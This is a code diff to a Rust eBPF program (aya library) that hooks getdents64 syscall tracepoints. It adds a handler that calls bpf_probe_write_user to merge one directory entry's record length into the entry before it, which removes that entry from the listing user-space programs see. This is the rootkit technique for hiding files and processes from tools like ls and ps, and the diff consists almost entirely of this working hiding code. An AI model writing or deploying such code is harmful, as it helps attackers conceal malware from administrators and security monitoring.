@@ -5,7 +5,7 @@ use core::mem::size_of_val;
 
 use aya_ebpf::{
     helpers::{
-        bpf_get_current_pid_tgid,
+        bpf_get_current_pid_tgid, bpf_probe_write_user,
         gen::{bpf_probe_read_user, bpf_probe_read_user_str},
     },
     macros::{map, tracepoint},
@@ -53,13 +53,8 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
 
-    // let pid = pid_tgid >> 32;
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
-    // field:unsigned int fd;                  offset:16; size:8; signed:0;
     // field:struct linux_dirent64 * dirent;   offset:24; size:8; signed:0;
-    // field:unsigned int count;               offset:32; size:8; signed:0;
-    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
-    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
     // 获取dirent指针内存地址
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
@@ -167,7 +162,54 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
 
 #[tracepoint]
 fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
-    info!(&ctx, "evening");
+    info!(&ctx, "we have found it");
+    let pid_tgid = bpf_get_current_pid_tgid() as usize;
+    let pbuff_addr = unsafe { map_to_patch.get(&pid_tgid) };
+    if pbuff_addr.is_none() {
+        return Ok(0);
+    }
+    let pbuff_addr = pbuff_addr.unwrap();
+
+    let buff_addr = *pbuff_addr;
+    let dirp_previous = buff_addr as *mut linux_dirent64;
+    let d_reclen_previous: u16 = 0;
+
+    unsafe {
+        bpf_probe_read_user(
+            &d_reclen_previous as *const _ as *mut core::ffi::c_void,
+            size_of_val(&d_reclen_previous) as u32,
+            &((*dirp_previous).d_reclen) as *const _ as *const core::ffi::c_void,
+        );
+    }
+
+    let dirp = (buff_addr as u64 + d_reclen_previous as u64) as *mut linux_dirent64;
+    let d_reclen: u16 = 0;
+
+    unsafe {
+        bpf_probe_read_user(
+            &d_reclen as *const _ as *mut core::ffi::c_void,
+            size_of_val(&d_reclen) as u32,
+            &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
+        );
+    }
+
+    let d_reclen_new = d_reclen_previous + d_reclen;
+    let ret = unsafe {
+        bpf_probe_write_user(
+            &((*dirp_previous).d_reclen) as *const _ as *mut u16,
+            &d_reclen_new,
+        )
+    };
+
+    if ret.is_err() {
+        info!(&ctx, "failed to correct");
+        return Ok(0);
+    } else {
+        info!(&ctx, "succeed to correct");
+    }
+
+
+    map_to_patch.remove(&pid_tgid).unwrap();
     return Ok(0);
 }
 
